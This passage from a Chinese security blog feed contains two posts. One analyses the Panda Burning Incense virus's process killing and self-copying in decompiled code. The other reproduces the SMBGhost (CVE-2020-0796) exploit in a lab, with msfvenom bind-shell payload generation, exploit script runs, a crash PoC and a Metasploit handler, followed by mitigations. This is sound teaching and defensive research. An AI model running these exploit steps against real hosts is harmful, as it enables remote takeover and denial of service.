class="headerlink" title="6.1.9.5 sub_403EB4"></a>6.1.9.5 sub_403EB4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_403EB4@&lt;eax&gt;(<span class="type">char</span> **a1@&lt;eax&gt;, <span class="type">char</span> *a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.43.png" class="" title="sub_403EB4()函数分析"><p>由于eax为0，合理猜测返回值会存到eax中。而这个值是指向真正内容的地址。它内部有一个<code>sub_403D34()</code>函数，也就是<code>StringCopy()</code>。</p><img src="/posts/a48809a5/6.1.44.png" class="" title="sub_403EB4()函数分析"><img src="/posts/a48809a5/6.1.45.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-6-sub-405068"><a href="#6-1-9-6-sub-405068" class="headerlink" title="6.1.9.6 sub_405068"></a>6.1.9.6 sub_405068</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_405068@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>里面又调用到了<code>sub_404DAC()</code>，这次取<code>Process32Next()</code>函数，检索有关系统快照中记录的下一个进程的信息。将它更名为<code>ProcessNext()</code>。</p><p>循环几次发现，循环的作用是遍历系统中的所有进程，查找名为<code>spoclsv.exe</code>的程序。转换为大写字母我猜是进行了一个简单的加密操作而已。</p><img src="/posts/a48809a5/6.1.46.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-7-sub-4060B4"><a href="#6-1-9-7-sub-4060B4" class="headerlink" title="6.1.9.7 sub_4060B4"></a>6.1.9.7 sub_4060B4</h4><p>当在快照中找到<code>spoclsv.exe</code>后，执行<code>sub_4060B4()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall sub_4060B4@&lt;eax&gt;(DWORD a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE v1; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v1 = OpenProcess(<span class="number">0x1F0FFF</span>u, <span class="number">-1</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)TerminateProcess(v1, <span class="number">0</span>) &gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个API函数：<code>OpenProcess()</code>和<code>TerminateProcess()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">OpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwDesiredAccess,<span class="comment">//渴望得到的访问权限（标志）</span></span></span><br><span class="line"><span class="params">  [in] BOOL  bInheritHandle,<span class="comment">// 是否继承句柄</span></span></span><br><span class="line"><span class="params">  [in] DWORD dwProcessId<span class="comment">// 进程标示符</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>OpenProcess()</code>函数用来打开一个已存在的进程对象，并返回进程的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">TerminateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE hProcess,</span></span><br><span class="line"><span class="params">  [in] UINT   uExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>TerminateProcess()</code>用来终止指定的进程及其所有线程。</p><img src="/posts/a48809a5/6.1.47.png" class="" title="sub_4060B4()函数分析"><p>在这里，<code>spoclsv.exe</code>的进程ID为0x1376C，<code>OpenProcess()</code>的作用是将<code>spoclsv.exe</code>赋予所有权限，继承句柄。返回值为<code>spoclsv.exe</code>的句柄0xA4。接着使用<code>TerminateProcess()</code>终止<code>spoclsv.exe</code>。</p><img src="/posts/a48809a5/6.1.48.png" class="" title="sub_4060B4()函数分析"><p>将它更名为<code>GrantAllRights()</code>。</p><p>最后使用<code>CloseHandle()</code>关闭快照的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CloseHandle</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hObject</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>以上就是<code>sub_4060D4()</code>完整的一个流程，简单来说就是捕获当前系统所有进程的状态，遍历所有进程找到指定进程并赋予所有访问权限，最后关闭自身达到隐藏目的，将它更名为<code>GrantAllRightsAndClose()</code>。</p><h3 id="6-1-10-sub-4040CC"><a href="#6-1-10-sub-4040CC" class="headerlink" title="6.1.10 sub_4040CC"></a>6.1.10 sub_4040CC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_4040CC@&lt;eax&gt;(<span class="type">char</span> *result@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.49.png" class="" title="sub_4040CC()函数分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004040CC  /$  85C0          test eax,eax</span><br><span class="line">004040CE  |.  74 02         je short setup.004040D2</span><br><span class="line">004040D0  |.  C3            retn</span><br><span class="line">004040D1  |   00            db 00</span><br><span class="line">004040D2  |&gt;  B8 D1404000   mov eax,setup.004040D1</span><br><span class="line">004040D7  \.  C3            retn</span><br></pre></td></tr></table></figure><p>这个函数的作用是比较eax的值是否为0，可以用来检测返回值、判断文件是否存在等。</p><h3 id="6-1-11-回到父函数sub-408024"><a href="#6-1-11-回到父函数sub-408024" class="headerlink" title="6.1.11 回到父函数sub_408024"></a>6.1.11 回到父函数sub_408024</h3><p>继续看下面的API函数<code>SetFileAttributesA()</code>，用来设置文件或目录的属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">SetFileAttributesA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpFileName,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwFileAttributes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileName：要设置其属性的文件名。</li><li>dwFileAttributes：带有<code>FILE_ATTRIBUTE_</code>前缀的一个或多个常数，用来设置文件属性。</li></ul><div class="table-container"><table><thead><tr><th>Attribute</th><th>Meaning</th></tr></thead><tbody><tr><td>FILE_ATTRIBUTE_ARCHIVE<br />32 (0x20)</td><td>该文件是一个存档文件。应用程序使用此属性来备份或移除标记文件。</td></tr><tr><td>FILE_ATTRIBUTE_HIDDEN<br />2 (0x2)</td><td>该文件是隐藏的。它不包括在普通的目录列表。</td></tr><tr><td>FILE_ATTRIBUTE_NORMAL<br />128 (0x80)</td><td>该文件没有设置其他的属性。此属性仅在单独使用有效。</td></tr><tr><td>FILE_ATTRIBUTE_NOT_CONTENT_INDEXED<br />8192 (0x2000)</td><td>该文件将不被内容索引服务编制索引。</td></tr><tr><td>FILE_ATTRIBUTE_OFFLINE<br />4096 (0x1000)</td><td>该文件的数据不是立即可用。此属性表明文件数据被物理移动到离线存储。此属性用于通过远程存储，分层存储管理软件。应用程序不应随意更改此属性。</td></tr><tr><td>FILE_ATTRIBUTE_READONLY<br />1 (0x1)</td><td>该文件是只读的。应用程序可以读取该文件，但不能写入或删除它。</td></tr><tr><td>FILE_ATTRIBUTE_SYSTEM<br />4 (0x4)</td><td>该文件是操作系统的一部分，或者完全由它使用。</td></tr><tr><td>FILE_ATTRIBUTE_TEMPORARY<br />256 (0x100)</td><td>该文件是被用于暂时存储。文件系统避免写入数据传回海量存储如果有足够的缓存内存可用，因为经常在应用程序删除后不久，这个句柄被关闭的临时文件。在这种情况下，该系统可以完全避免记录的数据。否则，在手柄关闭的数据将被写入。</td></tr></tbody></table></div><img src="/posts/a48809a5/6.1.50.png" class="" title="sub_408024()函数分析"><p>将<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>设置为<code>FILE_ATTRIBUTE_NORMAL</code>属性。</p><p>继续往下看到<code>CopyFileA()</code>，将现有文件复制到新文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CopyFileA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpExistingFileName,</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpNewFileName,</span></span><br><span class="line"><span class="params">  [in] BOOL   bFailIfExists</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.51.png" class="" title="sub_408024()函数分析"><p>继续看<code>WinExec()</code>，运行指定的程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UINT <span class="title function_">WinExec</span><span class="params">(</span></span><br><span class="line"><span class="params">    LPCSTR lpCmdLine, </span></span><br><span class="line"><span class="params">    UINT uCmdShow</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpCmdLine：指向一个空结束的字符串，串中包含将要执行的应用程序的命令行（文件名加上可选参数）。</li><li>uCmdShow：定义Windows应用程序的窗口如何显示，并为<code>CreateProcess()</code>函数提供<code>STARTUPINFO</code>参数的<code>wShowWindow</code>成员的值。</li></ul><div class="table-container"><table><thead><tr><th>uCmdShow参数可选值</th><th>含义</th></tr></thead><tbody><tr><td>SW_HIDE = 0</td><td>隐藏, 并且任务栏也没有最小化图标</td></tr><tr><td>SW_SHOWNORMAL = 1</td><td>用最近的大小和位置显示, 激活</td></tr><tr><td>SW_NORMAL = 1</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_SHOWMINIMIZED = 2</td><td>最小化, 激活</td></tr><tr><td>SW_SHOWMAXIMIZED = 3</td><td>最大化, 激活</td></tr><tr><td>SW_MAXIMIZE = 3</td><td>同 SW_SHOWMAXIMIZED</td></tr><tr><td>SW_SHOWNOACTIVATE = 4</td><td>用最近的大小和位置显示, 不激活</td></tr><tr><td>SW_SHOW = 5</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_MINIMIZE = 6</td><td>最小化, 不激活</td></tr><tr><td>SW_SHOWMINNOACTIVE = 7</td><td>同 SW_MINIMIZE</td></tr><tr><td>SW_SHOWNA = 8</td><td>同 SW_SHOWNOACTIVATE</td></tr><tr><td>SW_RESTORE = 9</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_SHOWDEFAULT = 10</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_MAX = 10</td><td>同 SW_SHOWNORMAL</td></tr></tbody></table></div><p>返回值：</p><ul><li>若函数调用成功，则返回值大于31。</li><li>若函数调用失败，则返回值为下列之一：<br>①　0：系统内存或资源已耗尽。<br>②　ERROR_BAD_FORMAT=11：EXE文件无效（非Win32.EXE或.EXE影像错误）。<br>③　ERROR_FILE_NOT_FOUND=2：指定的文件未找到。<br>④　ERROR_PATH_NOT_FOUND=3：指定的路径未找到。</li></ul><img src="/posts/a48809a5/6.1.52.png" class="" title="sub_408024()函数分析"><p>这里表示运行<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>，用最近的大小和位置显示，激活。</p><p><code>ExitProcess()</code>函数用来结束调用进程及其所有线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ExitProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] UINT uExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>运行到这里时，<code>setup.exe</code>的工作已经结束了。什么？！但我们的病毒远不止有这些功能啊？回看哪个地方可以让我们跳过<code>ExitProcess()</code>。</p><img src="/posts/a48809a5/6.1.53.png" class="" title="sub_408024()函数分析"><p>发现在字符串对比时，字符串为<code>C:\WINDOWS\SYSTEM32\DRIVERS\SPOCLSV.EXE</code>才可以跳过<code>ExitProcess()</code>继续执行病毒的其它功能。那么怎么才能让字符串为这个呢？</p><img src="/posts/a48809a5/6.1.54.png" class="" title="sub_408024()函数分析"><p>通过IDA可以看到，我们通过<code>GetFilePathAndName()</code>获取的当前路径名要等于<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>才可以绕过<code>ExitProcess()</code>函数。</p><p>这意味着，<code>setup.exe</code>的功能是将自己读到内存中去，复制自身到<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>，赋予普通文件权限，最后启动<code>spoclsv.exe</code>，<code>setup.exe</code>的任务就完成了，接下来就是<code>spoclsv.exe</code>要做的事情了。</p><p>加载<code>spoclsv.exe</code>到IDA和OD，重走一遍<code>sub_408024()</code>函数，观察流程与<code>setup.exe</code>有何不同。前面都一样，又来到了这里。</p><img src="/posts/a48809a5/6.1.55.png" class="" title="sub_408024()函数分析"><p>这次两个字符串一致，绕过<code>ExitProcess()</code>函数继续执行病毒的其它功能。</p><h3 id="6-1-12-sub-40416C"><a href="#6-1-12-sub-40416C" class="headerlink" title="6.1.12 sub_40416C"></a>6.1.12 sub_40416C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_40416C@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.56.png" class="" title="sub_40416C()函数分析"><p>eax存的是PE文件加载进内存的起始地址，edx存的是文件大小，ecx的值为0。</p><p>用OD走一下流程，进入<code>sub_40411C()</code>。如果<code>dword ptr ds:[edx-0x8]</code>的值为1，则跳过下面的<code>AllocStackAndCopyString()</code>函数，否则执行<code>AllocStackAndCopyString()</code>。</p><img src="/posts/a48809a5/6.1.59.png" class="" title="sub_40411C()函数分析"><p>分析汇编指令可知，如果执行<code>AllocStackAndCopyString()</code>，则分配0xEC00大小的空间，将自身拷贝到分配的那个内存空间中去。所以可以猜测这个函数的功能是判断病毒程序是否被加载进内存。（？不知道分析的对不对，感觉有点问题）</p><h3 id="6-1-13-sub-4041B4"><a href="#6-1-13-sub-4041B4" class="headerlink" title="6.1.13 sub_4041B4"></a>6.1.13 sub_4041B4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_4041B4@&lt;eax&gt;(_BYTE *result@&lt;eax&gt;, _BYTE *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>这个函数传入的参数是两个byte型指针，返回值也是一个byte型指针。</p><img src="/posts/a48809a5/6.1.57.png" class="" title="sub_4041B4()函数分析"><p>看到byte数据类型很容易联想到这是否是一个标记，<code>sub_4041B4()</code>就是查找程序中是否包含这个标记，如果包含这个标记，则执行jg跳转，否则不跳转。</p><p>进入函数，发现edx为0直接对eax清零，退出函数。说明该程序没有这个标记，如果有，则edx不应该为0且会进入到循环执行某些操作，退出函数后执行jg跳转。</p><img src="/posts/a48809a5/6.1.58.png" class="" title="sub_4041B4()函数分析"><p>如果执行jg跳转，经过非常多函数后，最后执行<code>ExitProcess()</code>函数退出程序，也就去不到熊猫烧香的其它核心函数了。所以可以猜测这个标记应该就是病毒将正常的PE文件感染后，在原本正常PE文件中添加的01标记，用于标识该程序是否被感染。如果真是这样的话，若想分析跳转后的程序内容，可以在OD中修改标志位，或对一个被感染的程序进行分析。</p><p>将这个函数命名为<code>SearchSignPos()</code>。</p><p>由于我们现在分析的是<code>spoclsv.exe</code>，它自身没有0x01标记，因此跳转不成立，继续往下执行。</p><p>下面的指令主要用于收尾工作，最后的call用于删除堆栈中所保存的地址，这些地址指向的是病毒写入的一些信息。</p><h3 id="6-1-14-总结"><a href="#6-1-14-总结" class="headerlink" title="6.1.14 总结"></a>6.1.14 总结</h3><p>至此，熊猫烧香样本的第一个核心函数分析完毕。</p><p>它的主要功能是先获取当前程序的绝对路径，再获取不包含程序名的绝对路径，查找该目录下是否有<code>Desktop_.ini</code>文件，如果有则将文件属性设置为普通文件，接着删除该文件。</p><blockquote><p><code>Desktop_.ini</code>文件是系统可识别文件，其作用是存储用户对文件夹的个性设置，比如用户更改了文件夹图标、背景颜色等等，其配置信息都会存入到这个文件夹的<code>Desktop_.ini</code>文件中，用户可以使用记事本的方式打开，里面均为一些代码配置文件。</p><p><code>Desktop_.ini</code>文件属于文件夹的配置文件，用户可以删除，删除后不会影响文件夹，只是会让文件夹恢复为默认设置。另外，<code>Desktop_.ini</code>文件并不是病毒文件。</p><p>值得一提的是，<code>Desktop_.ini</code>文件默认为系统配置文件，大小仅几Kb左右，不过如果用户设置的项目较多的话，也会导致<code>Desktop_.ini</code>文件变的很大。这个文件如果容量很大的话，打开这个文件夹容易出现卡死现象，因此也经常会有一些电脑高手恶搞，将一个电影文件改成<code>Desktop_.ini</code>文件，然后放置在电脑桌面或者文件夹当中，导致电脑变卡。</p></blockquote><p>如果没有该文件则将病毒信息写入到内存中，并检查是否将病毒完全写入，如果没有完全写入则调用for循环将剩余信息写入到内存中。获取当前程序路径转换为大写字母的形式与构造的路径<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>转换为大写字母的形式比较，如果不一致则创建或重写<code>spoclsv.exe</code>，设置为普通文件属性，将当前程序复制到<code>spoclsv.exe</code>(相当于复制<code>setup.exe</code>到指定目录，更名为<code>spoclsv.exe</code>)，运行<code>spoclsv.exe</code>，退出当前程序。检查<code>spoclsv.exe</code>是否被感染，也就是是否有01标记，由于它是病毒自身，不存在是否被感染问题，所以跳过一大段对非病毒程序的操作，执行最后的函数收尾工作。</p><h2 id="6-2-sub-40CA5C函数分析"><a href="#6-2-sub-40CA5C函数分析" class="headerlink" title="6.2 sub_40CA5C函数分析"></a>6.2 sub_40CA5C函数分析</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;熊猫烧香是Windows PE病毒，属于捆绑释放型。具体有关PE病毒的知识参照我写的另一篇笔记 &lt;a href=&quot;https://v5le0n9.github.io/posts/adc1352a.html&quot;&gt;Windows PE病毒分类及感染方式&lt;/a&gt; 。&lt;/p&gt;
&lt;p&gt;熊猫烧香是一款非常具有代表性的病毒，当年造成了非常大的影响，并且也有一定的技术手段。用它来入门恶意样本分析是非常适合的，所以就拿它来开刀了。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796漏洞复现及防御机制</title>
    <link href="http://example.com/posts/df5ab46f.html"/>
    <id>http://example.com/posts/df5ab46f.html</id>
    <published>2022-05-27T14:04:19.047Z</published>
    <updated>2022-05-28T06:44:00.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞描述"><a href="#1-1-漏洞描述" class="headerlink" title="1.1 漏洞描述"></a>1.1 漏洞描述</h2><p>CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。</p><span id="more"></span><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>在微软SMBv3远程代码执行漏洞中，SMB 3.1.1协议处理压缩消息时，对其中的数据没有经过安全检查，直接使用可能引发内存破坏漏洞，从而被攻击者利用远程执行任意代码。攻击者通过发送特殊构造的数据包触发漏洞，无需用户验证就可能控制目标系统，同时影响服务器与客户端系统。</p><p>该漏洞存在于Windows的SMBv3.0(文件共享与打印服务)中，利用的端口是445。当SMBv3.0处理恶意制作的压缩数据包时，由于SMB没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压，并没有检查长度是否合法，最终导致整数溢出。远程未经认证的供给者就可能利用此漏洞在应用程序的上下文中执行任意代码，系统受到非授权控制。</p><p>根据安全研究人员分析，该漏洞是一个整数溢出，发生在SMB服务驱动srv2.sys的<code>Srv2DecompressData()</code>函数中。</p><p>详细请看：</p><p><a href="https://nosec.org/home/detail/4420.html">https://nosec.org/home/detail/4420.html</a></p><p><a href="https://blog.csdn.net/weixin_44058342/article/details/105275847">https://blog.csdn.net/weixin_44058342/article/details/105275847</a></p><p><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a></p><p><a href="https://www.cnblogs.com/goabout2/p/12609810.html">https://www.cnblogs.com/goabout2/p/12609810.html</a></p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>漏洞主要影响Windows 10版本（1903和1909），包括32位、64位的家用版、专业版、企业版、教育版。</p><h2 id="1-4-影响方式"><a href="#1-4-影响方式" class="headerlink" title="1.4 影响方式"></a>1.4 影响方式</h2><p>微软SMBv3(Server Message Block 3.0)服务远程代码执行漏洞(CVE-2020-0796)可被攻击者利用，实现无须权限即可执行远程代码，受攻击的目标系统只需开机在线即可能被入侵。该漏洞后果十分接近永恒之蓝系列，存在被WannaCry等勒索蠕虫利用的可能，攻击者可以构造特定的网页、压缩包、共享目录、Office文档等多种方式触发漏洞进行攻击，对存在该漏洞的Windows主机造成严重威胁。</p><h2 id="1-5-漏洞评级"><a href="#1-5-漏洞评级" class="headerlink" title="1.5 漏洞评级"></a>1.5 漏洞评级</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796: 高危</span><br></pre></td></tr></table></figure><h1 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2. 漏洞复现"></a>2. 漏洞复现</h1><h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p><p>靶机：Windows 10 Version 1903 x64 教育版（IP地址：192.168.193.142 / 192.168.193.143）</p><p>利用工具：</p><ul><li>MSF</li><li>Windows平台漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></li><li>Linux平台漏洞检测工具：<a href="https://github.com/joaozietolie/CVE-2020-0796-Checker">https://github.com/joaozietolie/CVE-2020-0796-Checker</a></li><li>本地EXP提权：<a href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-2020-0796</a></li><li>POC蓝屏攻击： <a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></li><li>RCE poc：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></li></ul><h2 id="2-2-复现准备"><a href="#2-2-复现准备" class="headerlink" title="2.2 复现准备"></a>2.2 复现准备</h2><p>检查靶机中的445端口是否已经打开。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.2.1.png" class="" title="检查445端口"><p>如果没有打开，在Windows 防火墙中添加入站规则，开启端口445。</p><p>开启文件共享，否则Kali用nmap扫描时不会探测到靶机开启了445端口。</p><img src="/posts/df5ab46f/2.2.3.png" class="" title="开启文件共享"><img src="/posts/df5ab46f/2.2.2.png" class="" title="开启文件共享"><h2 id="2-3-复现过程"><a href="#2-3-复现过程" class="headerlink" title="2.3 复现过程"></a>2.3 复现过程</h2><h3 id="2-3-1-本地提权"><a href="#2-3-1-本地提权" class="headerlink" title="2.3.1 本地提权"></a>2.3.1 本地提权</h3><p>使用奇安信检测CVE-2020-0796漏洞工具，它适用于局域网批量检测，快速查找未打补丁的主机。</p><img src="/posts/df5ab46f/2.3.1.png" class="" title="检测漏洞"><p>使用本地EXP提权，下载下来是VS的一个工程文件，需要利用VS编译生成EXE文件。</p><p>查看当前用户，是普通用户，运行<code>cve-2020-0796-local.exe</code>后弹出另一个cmd窗口，在那个cmd窗口下的用户已经变成管理员了。</p><img src="/posts/df5ab46f/2.3.2.png" class="" title="本地提权"><h3 id="2-3-2-蓝屏攻击"><a href="#2-3-2-蓝屏攻击" class="headerlink" title="2.3.2 蓝屏攻击"></a>2.3.2 蓝屏攻击</h3><p>使用Linux平台CVE-2020-0796漏洞检测工具检查靶机是否存在该漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash CVE-2020-0796-Checker.sh -t 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.3.png" class="" title="检测漏洞"><p>确认存在该漏洞后，使用POC蓝屏攻击脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.5.png" class=""><p>靶机成功蓝屏：</p><img src="/posts/df5ab46f/2.3.4.png" class="" title="靶机蓝屏"><h3 id="2-3-3-远程登录"><a href="#2-3-3-远程登录" class="headerlink" title="2.3.3 远程登录"></a>2.3.3 远程登录</h3><p>RCE(remote command/code excute)，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p>利用MSF生成Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=1234 -f py -o smb.py</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.7.png" class="" title="生成payload"><p>将Payload里的<code>buf</code>变量更名为<code>USER_PAYLOAD</code>，再将RCE poc中的<code>exploit.py</code>中的<code>USER_PAYLOAD</code>的值更换成Payload中的值。</p><p>给<code>exploit.py</code>增加执行权限，执行文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exploit.py</span><br><span class="line">python3 exploit.py -ip 192.168.193.143</span><br></pre></td></tr></table></figure><img src="/posts/df5ab46f/2.3.6.png" class="" title="运行exploit"><p>利用MSF开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.193.143</span><br><span class="line">set lport 1234</span><br><span class="line">show options#查看还有没有参数没有设置的</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>结果运行到这里一直卡住：</p><img src="/posts/df5ab46f/2.3.8.png" class="" title="运行卡住"><p><strong>不知道什么问题，运行了很多次仍然卡在这。</strong></p><p>实现远程登录后再通过本地提权，可以拿到靶机的管理员权限。</p><h1 id="3-防御方法"><a href="#3-防御方法" class="headerlink" title="3. 防御方法"></a>3. 防御方法</h1><ul><li><p>安装补丁。</p></li><li><p>根据BleepComputer的说法，尽管微软并未共享禁用SMBv3压缩的官方方法，但是Foregenix Solutions架构师Niall Newman在分析了Srv2.sys文件后可以通过手动修改注册表，防止被黑客远程攻击。</p><ul><li><p>在注册表“HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters”建立一个名为<code>DisableCompression</code>的DWORD，值为1，禁止SMB的压缩功能。</p></li><li><p>或在管理员模式启动PowerShell，输入以下命令，执行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 